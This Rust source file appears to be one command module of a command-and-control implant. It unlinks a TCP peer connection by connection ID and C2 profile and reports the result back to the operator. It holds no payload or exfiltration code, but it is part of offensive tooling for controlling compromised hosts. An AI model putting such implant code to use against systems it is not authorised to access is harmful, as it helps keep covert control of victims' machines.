use crate::structs::{RemoveInternalConnectionMessage, Task};
use serde::Deserialize;

#[derive(Deserialize)]
struct UnlinkTcpArgs {
    connection_id: String,
    #[serde(default = "default_profile")]
    c2_profile_name: String,
}

fn default_profile() -> String { "tcp".to_string() }

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: UnlinkTcpArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let msg = RemoveInternalConnectionMessage {
        connection_uuid: args.connection_id.clone(),
        c2_profile_name: args.c2_profile_name,
    };

    match task.job.remove_internal_connection_channel.send(msg).await {
        Ok(_) => {
            response.user_output = format!("Unlinked: {}", args.connection_id);
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to unlink: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
